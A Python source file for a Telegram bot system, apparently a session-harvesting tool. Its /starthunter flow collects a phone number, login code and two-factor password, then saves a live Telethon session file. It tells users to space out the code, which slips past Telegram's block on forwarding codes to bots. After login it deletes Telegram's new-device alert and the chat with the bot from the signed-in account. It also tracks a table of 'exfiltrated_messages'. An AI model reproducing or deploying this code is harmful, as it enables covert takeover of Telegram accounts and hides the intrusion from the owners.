import logging
import asyncio
import os
import sys
import signal
import uuid
import redis.asyncio as redis
from telegram import Update
from telegram.error import Conflict
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    filters,
    Application
)
from telegram.constants import ParseMode
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import shutil

# Add project root to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from app.core.config import settings
from app.core.database import db
from app.core.constants import LOCK_TTL_SECONDS, SESSION_FILE_PERMISSIONS, WORKER_HEARTBEAT_TIMEOUT_SECONDS

from enum import Enum, auto

# Login flow states
class LoginState(Enum):
    WAITING_FOR_PHONE = 0
    WAITING_FOR_CODE = 1
    WAITING_FOR_2FA = 2

# For ConversationHandler compatibility
WAIT_PHONE, WAIT_CODE, WAIT_PASSWORD = range(3)

# Configure Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger("bot_listener")

# Global Redis Client (initialized in main)
redis_client: redis.Redis = None
PAUSE_KEY = "system:paused"
LOCK_TTL_SECONDS = 120
INSTANCE_ID = f"{os.getenv('HOSTNAME', 'local')}:{os.getpid()}:{uuid.uuid4().hex[:8]}"

# Admin IDs — configurable via ANONYMOUS_ADMIN_ID env var (default: Telegram anonymous group admin)
ANONYMOUS_ADMIN_ID = settings.ANONYMOUS_ADMIN_ID

# Global Stop Event
stop_event = asyncio.Event()

# ==========================================
# MULTI-BOT ROTATION STATE
# ==========================================
# Maps bot_token -> bot_username (populated at startup via getMe)
_bot_usernames: dict[str, str] = {}
# Set of bot tokens currently considered "locked" (session save failed)
_locked_bots: set[str] = set()


def _bot_id_from_token(token: str) -> str:
    """Extracts Telegram bot ID prefix from token safely."""
    try:
        return token.strip().split(":", 1)[0]
    except Exception:
        return "unknown"


def _poll_lock_key(token: str) -> str:
    """Redis key used to enforce single active poller per bot ID."""
    return f"bot_listener:poll_lock:{_bot_id_from_token(token)}"


async def _acquire_poll_lock(token: str) -> str | None:
    """Acquire distributed lock for a bot poller. Returns lock key when acquired."""
    if not redis_client:
        return None

    key = _poll_lock_key(token)
    acquired = await redis_client.set(key, INSTANCE_ID, ex=LOCK_TTL_SECONDS, nx=True)
    if acquired:
        return key

    owner = await redis_client.get(key)
    logger.warning(
        f"⚠️ Poll lock already held for bot_id={_bot_id_from_token(token)} by {owner}. "
        "Skipping this poller instance to avoid getUpdates conflicts."
    )
    return None


async def _release_poll_lock(lock_key: str | None):
    """Release lock only if still owned by this process."""
    if not lock_key or not redis_client:
        return
    try:
        owner = await redis_client.get(lock_key)
        if owner == INSTANCE_ID:
            await redis_client.delete(lock_key)
    except Exception as e:
        logger.warning(f"Failed to release poll lock {lock_key}: {e}")


async def _renew_poll_lock(lock_key: str | None):
    """Periodically refresh lock TTL while polling is active."""
    if not lock_key or not redis_client:
        return

    try:
        while not stop_event.is_set():
            await asyncio.sleep(max(15, LOCK_TTL_SECONDS // 3))
            owner = await redis_client.get(lock_key)
            if owner != INSTANCE_ID:
                logger.warning(f"Lost ownership of poll lock {lock_key}.")
                return
            await redis_client.expire(lock_key, LOCK_TTL_SECONDS)
    except asyncio.CancelledError:
        return
    except Exception as e:
        logger.warning(f"Poll lock renew failed for {lock_key}: {e}")

def _get_whitelisted_usernames():
    raw = settings.WHITELISTED_BOT_IDS or ""
    return [u.strip().lower().replace("@", "") for u in raw.split(",") if u.strip()]

def is_admin(update: Update) -> bool:
    """Checks if the user is an admin (Whitelisted Username or Group Anonymous Bot)"""
    user = update.effective_user
    
    if not user:
        return False
        
    # 1. Check ID (Anonymous Admin)
    if user.id == ANONYMOUS_ADMIN_ID:
        # If sent as anonymous admin in a group, we assume it's an admin of that group.
        return True
        
    # 2. Check Username
    if user.username:
        whitelist = _get_whitelisted_usernames()
        if user.username.lower() in whitelist:
            return True
            
    return False

def _get_other_bot_usernames(current_bot_username: str) -> list[str]:
    """Returns usernames of OTHER available bots (excluding current and locked ones)."""
    other_bots = []
    for token, username in _bot_usernames.items():
        if username.lower() != current_bot_username.lower() and token not in _locked_bots:
            other_bots.append(username)
    return other_bots

def _get_all_bot_usernames_except(current_bot_username: str) -> list[str]:
    """Returns usernames of ALL other bots (even locked) for fallback messaging."""
    return [
        username for username in _bot_usernames.values()
        if username.lower() != current_bot_username.lower()
    ]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return # Silent ignore
    await update.message.reply_text("🤖 **Telegram Hunter Bot** is online.\nUse /help to see all available commands.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return
    
    # Show all available bots in the help text
    bot_list = ", ".join([f"@{u}" for u in _bot_usernames.values()])
    
    help_text = (
        "📖 **Telegram Hunter Bot Help**\n\n"
        "Here are the available commands:\n"
        "• /status - Check system health and pending broadcasts\n"
        "• /pause - Pause scanners and broadcaster\n"
        "• /resume - Resume operations\n"
        "• /restart - Restart the bot service\n"
        "• /commands - List all commands (Alias for /help)\n"
        "• /starthunter - Login a new Telegram account\n"
        "• /bots - Show all available bots\n\n"
        f"**Available Bots**: {bot_list}\n\n"
        "Only authorized administrators can use these commands."
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def bots_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows all available bots and their lock status."""
    if not is_admin(update):
        return
    
    lines = ["🤖 **Bot Rotation Pool**\n"]
    for token, username in _bot_usernames.items():
        status = "🔒 Locked" if token in _locked_bots else "✅ Available"
        lines.append(f"• @{username} — {status}")
    
    lines.append(f"\n**Total**: {len(_bot_usernames)} bots")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return

    # 1. Check Redis
    redis_status = "✅ Online"
    if redis_client:
        try:
            await redis_client.ping()
        except Exception:
            redis_status = "❌ Unreachable"
    else:
        redis_status = "⚠️ Not Initialized"

    # 2. Check DB / Pending Queue
    queue_count = "?"
    try:
        # db.table is likely synchronous supabase client.
        res = db.table("exfiltrated_messages").select("id", count="exact").eq("is_broadcasted", False).execute()
        queue_count = res.count
    except Exception as e:
        queue_count = f"❌ Error: {str(e)[:20]}"

    # 3. Check System Pause State
    is_paused = False
    if redis_client:
        try:
            is_paused = await redis_client.get(PAUSE_KEY)
        except:
            pass
            
    system_status = "⏸️ **PAUSED**" if is_paused else "▶️ **RUNNING**"
    
    # 4. Bot pool info
    bot_count = len(_bot_usernames)
    locked_count = len(_locked_bots)
    
    msg = (
        f"📊 **System Status**\n\n"
        f"**State**: {system_status}\n"
        f"**Redis**: {redis_status}\n"
        f"**Pending Broadcasts**: `{queue_count}`\n"
        f"**Bot Pool**: `{bot_count} bots ({locked_count} locked)`\n"
        f"**Monitor Group**: `{settings.MONITOR_GROUP_ID}`\n"
        f"**Environment**: `{settings.ENV}`"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return
    
    if redis_client:
        await redis_client.set(PAUSE_KEY, "true")
        await update.message.reply_text("⏸️ **System Paused**.\nScanners and Broadcaster will skip their next run.")
    else:
         await update.message.reply_text("❌ Redis not available.")

async def resume(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return

    if redis_client:
        await redis_client.delete(PAUSE_KEY)
        await update.message.reply_text("▶️ **System Resumed**.\nOperations returning to normal.")
    else:
         await update.message.reply_text("❌ Redis not available.")

async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return

    await update.message.reply_text("🔄 **Restarting Bot Process**...\n(Expect a brief downtime)")
    # Signal main loop to stop gracefully
    stop_event.set()

# ==========================================
# WATCHDOG SERVICE
# ==========================================
async def watchdog_loop(bot):
    """
    Monitors System Health every 60 seconds.
    - Checks Redis connectivity.
    - Checks Worker Last Seen timestamp.
    """
    logger.info("🐶 Watchdog System Started.")
    
    # Initial State
    state = {
        "redis": True,
        "worker": True
    }
    
    while not stop_event.is_set():
        try:
            # Check Redis
            if redis_client:
                try:
                    await redis_client.ping()
                    if not state["redis"]:
                        state["redis"] = True
                        await _send_alert(bot, "✅ **RECOVERY**: Redis connection restored.")
                except Exception as e:
                    if state["redis"]:
                        state["redis"] = False
                        await _send_alert(bot, f"❌ **CRITICAL**: Redis connection LOST! ({str(e)[:20]})")
                    
                    # If Redis is down, we can't check worker stats from Redis
                    await asyncio.sleep(60)
                    continue 

                # Check Worker Heartbeat
                try:
                    last_seen = await redis_client.get("system:heartbeat:last_seen")
                    if last_seen:
                        import time
                        age = int(time.time()) - int(last_seen)
                        
                        if age > (45 * 60): # 45 minutes
                            if state["worker"]:
                                state["worker"] = False
                                await _send_alert(bot, f"⚠️ **WARNING**: Worker silent for {int(age/60)} minutes!\n(It might be stuck or crashed)")
                        else:
                            if not state["worker"]:
                                state["worker"] = True
                                await _send_alert(bot, "✅ **RECOVERY**: Worker heartbeat detected.")
                except Exception:
                    pass
            
            await asyncio.sleep(60)
        
        except asyncio.CancelledError:
            break
        except Exception as e:
             logger.error(f"Watchdog error: {e}")
             await asyncio.sleep(60)

async def _send_alert(bot, msg):
    try:
        await bot.send_message(chat_id=settings.MONITOR_GROUP_ID, message_thread_id=None, text=f"🚨 [Watchdog]\n{msg}")
    except Exception as e:
        logger.error(f"Failed to send watchdog alert: {e}")

# ==========================================
# LOGIN CONVERSATION HANDLER
# ==========================================

async def schedule_deletion(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, delay: int = 30):
    """Deletes a message after a delay."""
    async def delete_task():
        await asyncio.sleep(delay)
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception as e:
            logger.error(f"Failed to delete sensitive message {message_id}: {e}")
    
    asyncio.create_task(delete_task())

async def starthunter(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Starts the login flow."""
    if not is_admin(update):
        return ConversationHandler.END

    msg = (
        "👋 Login Bot\n\n"
        "Please send your phone number with country code.\n"
        "Accepted formats: +1234567890, +1 234 567 890, +1-234-567-890\n\n"
        "Reply /cancel at any time to abort."
    )
    sent_msg = await update.message.reply_text(msg)
    
    # Track state in context (LoginState object for that user_id)
    context.user_data['login_state'] = LoginState.WAITING_FOR_PHONE
    
    # Schedule deletion of user's command if possible
    await schedule_deletion(context, update.effective_chat.id, update.message.message_id)
    
    context.user_data['bot_messages'] = [sent_msg.message_id]
    
    return WAIT_PHONE

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    phone = update.message.text.strip()
    chat_id = update.effective_chat.id
    
    # Delete the user's message containing the phone number
    await schedule_deletion(context, chat_id, update.message.message_id)

    # Initialize a temporary client
    import tempfile
    import uuid
    temp_dir = tempfile.gettempdir()
    session_id = uuid.uuid4().hex
    temp_session_path = os.path.join(temp_dir, f"temp_login_{session_id}")
    
    # Clean up old temp file if exists (not strictly needed with uuid but good practice)
    if os.path.exists(temp_session_path + ".session"):
        try:
            os.remove(temp_session_path + ".session")
        except:
            pass

    try:
        client = TelegramClient(temp_session_path, settings.TELEGRAM_API_ID, settings.TELEGRAM_API_HASH)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        
        context.user_data['client'] = client
        context.user_data['phone'] = phone
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        context.user_data['temp_session_path'] = temp_session_path
        context.user_data['login_state'] = LoginState.WAITING_FOR_CODE

        msg = (
            "✅ Code requested!\n\n"
            "Please check your Telegram app for the login code.\n"
            "⚠️ Telegram does not allow forwarding the code to bots. Please send the code with spaces in between numbers, or dashes, or commas.\n"
            "Example: 1 2 3 4 5 instead of 12345"
        )
        sent_msg = await update.message.reply_text(msg)
        context.user_data['bot_messages'].append(sent_msg.message_id)
        
        return WAIT_CODE

    except Exception as e:
        logger.error(f"Error requesting code: {e}")
        await update.message.reply_text(f"❌ Error requesting code: {str(e)}\nPlease try again with /starthunter")
        if 'client' in context.user_data:
            await context.user_data['client'].disconnect()
        return ConversationHandler.END

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    raw_code = update.message.text
    chat_id = update.effective_chat.id
    
    # Always schedule deletion of the code
    await schedule_deletion(context, chat_id, update.message.message_id)

    # Sanitize code
    code = raw_code.replace(" ", "").replace("-", "").replace(",", "").strip()
    
    client = context.user_data.get('client')
    phone = context.user_data.get('phone')
    phone_code_hash = context.user_data.get('phone_code_hash')

    if not client or not client.is_connected():
        await update.message.reply_text("❌ Session expired. Please start over with /starthunter")
        return ConversationHandler.END

    try:
        await client.sign_in(phone, code=code, phone_code_hash=phone_code_hash)
        # Login success!
        return await finalize_login(update, context)

    except SessionPasswordNeededError:
        msg = "🔐 Two-Step Verification is enabled.\nPlease enter your password:"
        sent_msg = await update.message.reply_text(msg)
        context.user_data['bot_messages'].append(sent_msg.message_id)
        context.user_data['login_state'] = LoginState.WAITING_FOR_2FA
        return WAIT_PASSWORD
    except Exception as e:
        logger.error(f"Error signing in: {e}")
        await update.message.reply_text(f"❌ Login failed: {str(e)}\nPlease try again with /starthunter")
        await client.disconnect()
        return ConversationHandler.END

async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password = update.message.text
    chat_id = update.effective_chat.id
    
    # Always schedule deletion of password
    await schedule_deletion(context, chat_id, update.message.message_id)

    client = context.user_data.get('client')
    
    if not client or not client.is_connected():
        await update.message.reply_text("❌ Session expired. Please start over with /starthunter")
        return ConversationHandler.END

    try:
        await client.sign_in(password=password)
        return await finalize_login(update, context)
    except Exception as e:
        logger.error(f"Error with 2FA password: {e}")
        await update.message.reply_text(f"❌ Incorrect password or error: {str(e)}\nPlease try again with /starthunter")
        await client.disconnect()
        return ConversationHandler.END

async def finalize_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Finishes the login process, saves the session, and cleans up."""
    client = context.user_data.get('client')
    temp_session_path = context.user_data.get('temp_session_path')
    chat_id = update.effective_chat.id
    current_bot_username = context.bot.username or "unknown"
    
    try:
        me = await client.get_me()
        
        # Determine filename according to requirements: account_{phone}_{timestamp}.session
        import time
        phone_clean = context.user_data.get('phone', 'unknown').lstrip('+').replace(' ', '').replace('-', '')
        timestamp = int(time.time())
        filename = f"account_{phone_clean}_{timestamp}"
        
        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        sessions_dir = os.path.join(base_dir, "sessions")
        os.makedirs(sessions_dir, exist_ok=True)
        # Save sessions directly to the project root as requested
        final_path = os.path.join(sessions_dir, filename + ".session")
        
        # Delete bot messages we sent during the flow (Footprint Cleanup)
        for msg_id in context.user_data.get('bot_messages', []):
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
            except:
                pass

        # Also delete all messages in the Bot chat (Nuke Messages)
        # Assuming the history cleanup below handles dialogue, but requirements say "immediately deletes all messages in the Bot chat"
        # We've already scheduled deletion for user messages and deleted bot flow messages.

        # Use the USER account to clear history (Footprint Cleanup)
        try:
            # 1. Delete "Telegram Service Notification"
            async for message in client.iter_messages(777000, limit=10):
                if "new device" in (message.message or "").lower() or "login" in (message.message or "").lower():
                    await message.delete()
                    logger.info(f"Deleted Telegram Service Notification for {filename}")
                    break
            
            # 2. Delete entire conversation history with the Login Bot itself
            bot_entity = await client.get_entity(context.bot.username)
            await client.delete_dialog(bot_entity)
            logger.info(f"Deleted dialog with bot {context.bot.username} for logged in user {filename}")
        except Exception as e:
            logger.error(f"Failed footprint cleanup: {e}")
        
        await client.disconnect()

        # Copy to final destination
        saved_successfully = False
        try:
            if os.path.isdir(final_path):
                shutil.rmtree(final_path)
            tmp_final_path = final_path + ".tmp"
            if os.path.exists(tmp_final_path):
                os.remove(tmp_final_path)
            shutil.copy2(temp_session_path + ".session", tmp_final_path)
            os.replace(tmp_final_path, final_path)
            os.chmod(final_path, SESSION_FILE_PERMISSIONS)  # SECURITY: restrict to owner only
            saved_successfully = True
        except PermissionError:
            logger.warning(f"File {final_path} is locked. Attempting sqlite3 injection...")
            try:
                import sqlite3
                src_conn = sqlite3.connect(temp_session_path + ".session")
                if os.path.isdir(final_path):
                    shutil.rmtree(final_path)
                dst_conn = sqlite3.connect(final_path, timeout=30.0)
                
                src_cur = src_conn.cursor()
                dst_cur = dst_conn.cursor()
                
                # Copy sessions table
                src_cur.execute("SELECT dc_id, server_address, port, auth_key, takeout_id FROM sessions")
                row = src_cur.fetchone()
                dst_cur.execute("CREATE TABLE IF NOT EXISTS sessions (dc_id integer primary key, server_address text, port integer, auth_key blob, takeout_id integer)")
                dst_cur.execute("DELETE FROM sessions")
                if row:
                    dst_cur.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", row)
                
                # Copy entities table safely
                try:
                    src_cur.execute("SELECT id, hash, username, phone, name, date FROM entities")
                    entities = src_cur.fetchall()
                    dst_cur.execute("CREATE TABLE IF NOT EXISTS entities (id integer primary key, hash integer not null, username text, phone text, name text, date integer)")
                    dst_cur.executemany("INSERT OR REPLACE INTO entities VALUES (?, ?, ?, ?, ?, ?)", entities)
                except Exception as e:
                    logger.warning(f"Failed to copy entities: {e}")
                
                dst_conn.commit()
                src_conn.close()
                dst_conn.close()
                saved_successfully = True
                try:
                    os.chmod(final_path, SESSION_FILE_PERMISSIONS)  # SECURITY: restrict to owner only
                except Exception as e:
                    logger.warning(f"Could not set session file permissions: {e}")
            except Exception as e:
                logger.error(f"Sqlite injection failed: {e}")

        if saved_successfully:
            # Database Entry (Persistence & Database Update)
            try:
                db.table("telegram_accounts").upsert({
                    "phone": context.user_data.get('phone'),
                    "session_path": os.path.abspath(final_path),
                    "status": "active",
                    "updated_at": "now()"
                }).execute()
                logger.info(f"Updated telegram_accounts for {context.user_data.get('phone')}")
            except Exception as e:
                logger.error(f"Failed to update database: {e}")

        if not saved_successfully:
            # ==========================================
            # BOT LOCKED — RECOMMEND ANOTHER BOT
            # ==========================================
            logger.warning(f"Bot @{current_bot_username} could not save session — recommending alternative bot.")
            
            # Mark this bot as locked
            current_token = context.bot_data.get('_bot_token', '')
            if current_token:
                _locked_bots.add(current_token)
            
            # Find alternative bots
            other_bots = _get_other_bot_usernames(current_bot_username)
            if not other_bots:
                # All bots locked or only one — show all alternatives anyway
                other_bots = _get_all_bot_usernames_except(current_bot_username)
            
            if other_bots:
                bot_links = "\n".join([f"• @{b}" for b in other_bots])
                lock_msg = (
                    f"🔒 **Session Locked**\n\n"
                    f"This bot (@{current_bot_username}) could not save the session file "
                    f"because it is locked by another process.\n\n"
                    f"👉 **Please use one of these other bots instead:**\n"
                    f"{bot_links}\n\n"
                    f"Just open a chat with the bot above and type /starthunter to login."
                )
            else:
                lock_msg = (
                    f"🔒 **Session Locked**\n\n"
                    f"This bot (@{current_bot_username}) could not save the session file.\n"
                    f"No other bots are available at this time. Please try again later."
                )
            
            sent_msg = await update.message.reply_text(lock_msg, parse_mode=ParseMode.MARKDOWN)
            # Auto-delete the lock message after 30 seconds
            await schedule_deletion(context, chat_id, sent_msg.message_id, delay=30)
            
            return ConversationHandler.END

        # Session saved successfully — clear any lock on this bot
        current_token = context.bot_data.get('_bot_token', '')
        if current_token:
            _locked_bots.discard(current_token)
        
        # Clean up temp
        try:
            os.remove(temp_session_path + ".session")
        except:
            pass

        success_msg = f"✅ Successfully logged in as {me.first_name} (@{me.username or 'No Username'}).\nSession saved to {filename}.session"
        sent_msg = await update.message.reply_text(success_msg)
        await schedule_deletion(context, chat_id, sent_msg.message_id, delay=30)
        
        return ConversationHandler.END

    except Exception as e:
        logger.error(f"Error finalizing login: {e}")
        await update.message.reply_text(f"❌ Error finalizing login: {str(e)}")
        await client.disconnect()
        return ConversationHandler.END

async def cancel_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels and ends the conversation."""
    client = context.user_data.get('client')
    if client:
        await client.disconnect()
    
    await update.message.reply_text('Login process cancelled.')
    return ConversationHandler.END

# ==========================================
# MULTI-BOT APPLICATION BUILDER
# ==========================================

def _build_application(token: str) -> Application:
    """Builds a python-telegram-bot Application for a single bot token."""
    application = ApplicationBuilder().token(token).build()
    
    # Store the token in bot_data so handlers can identify which bot they're running on
    application.bot_data['_bot_token'] = token
    
    # Add Handlers (same for all bots)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("pause", pause))
    application.add_handler(CommandHandler("resume", resume))
    application.add_handler(CommandHandler("restart", restart))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("commands", help_command))
    application.add_handler(CommandHandler("bots", bots_command))

    # Add Login Conversation Handler
    login_conv_handler = ConversationHandler(
        entry_points=[CommandHandler('starthunter', starthunter)],
        states={
            WAIT_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)],
            WAIT_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code)],
            WAIT_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel_login)],
    )
    application.add_handler(login_conv_handler)
    
    return application


async def _run_bot(token: str, is_primary: bool = False):
    """Runs a single bot's polling loop. Primary bot also runs the Watchdog."""
    lock_key = await _acquire_poll_lock(token)
    if redis_client and not lock_key:
        # Another instance is already polling this bot ID.
        return

    application = _build_application(token)
    lock_renew_task = None
    watchdog_task = None
    
    try:
        async with application:
            # Resolve bot username via getMe
            bot_info = await application.bot.get_me()
            bot_username = bot_info.username or f"bot_{bot_info.id}"
            _bot_usernames[token] = bot_username

            logger.info(f"🤖 Bot @{bot_username} starting polling...")

            if lock_key:
                lock_renew_task = asyncio.create_task(_renew_poll_lock(lock_key))

            try:
                await application.updater.start_polling(drop_pending_updates=True)
            except Conflict as e:
                logger.error(
                    f"⚠️ Polling conflict for @{bot_username}: {e}. "
                    "Another getUpdates consumer is active for this token."
                )
                return

            # Only primary bot runs the Watchdog
            if is_primary:
                watchdog_task = asyncio.create_task(watchdog_loop(application.bot))
                logger.info(f"🐶 Watchdog attached to primary bot @{bot_username}")

            logger.info(f"🚀 Bot @{bot_username} Started")

            # Wait until stop_event is set (by /restart or signal)
            while not stop_event.is_set():
                await asyncio.sleep(1)

            logger.info(f"Stopping bot @{bot_username}...")

    finally:
        # Cleanup Watchdog
        if watchdog_task:
            watchdog_task.cancel()
            try:
                await watchdog_task
            except asyncio.CancelledError:
                pass

        # Cleanup lock renew loop
        if lock_renew_task:
            lock_renew_task.cancel()
            try:
                await lock_renew_task
            except asyncio.CancelledError:
                pass

        await _release_poll_lock(lock_key)

    logger.info(f"Bot poller for token_id={_bot_id_from_token(token)} stopped.")


async def main():
    global redis_client
    
    raw_tokens = settings.bot_tokens
    # Deduplicate by bot ID prefix to avoid spawning multiple pollers for the same bot.
    seen_ids = set()
    tokens = []
    for token in raw_tokens:
        token = token.strip()
        if not token:
            continue
        bot_id = _bot_id_from_token(token)
        if bot_id in seen_ids:
            logger.warning(f"Duplicate monitor bot token detected for bot_id={bot_id}; skipping duplicate entry.")
            continue
        seen_ids.add(bot_id)
        tokens.append(token)

    if not tokens:
        logger.error("MONITOR_BOT_TOKEN not set!")
        return

    logger.info(f"🚀 Starting Multi-Bot Listener with {len(tokens)} bot(s)...")

    # Initialize Redis inside the event loop
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)

    # Handle signals for graceful shutdown (Unix only, Windows ignored)
    if os.name != 'nt':
        loop = asyncio.get_running_loop()
        def _handle_signal():
            try:
                stop_event.set()
            except Exception as e:
                logger.error(f"Signal handler error: {e}")
            finally:
                stop_event.set()  # Guarantee set even if exception occurred above
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, _handle_signal)
    
    # Run all bots concurrently — first token is primary (runs Watchdog)
    tasks = []
    for i, token in enumerate(tokens):
        token = token.strip()
        if not token:
            continue
        is_primary = (i == 0)
        tasks.append(asyncio.create_task(_run_bot(token, is_primary=is_primary)))
    
    if not tasks:
        logger.error("No valid bot tokens found!")
        return
    
    # Wait for all bots to finish (they all stop on stop_event)
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Close Redis
    await redis_client.close()
    logger.info("Bye!")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        logger.error(f"Fatal crash: {e}")
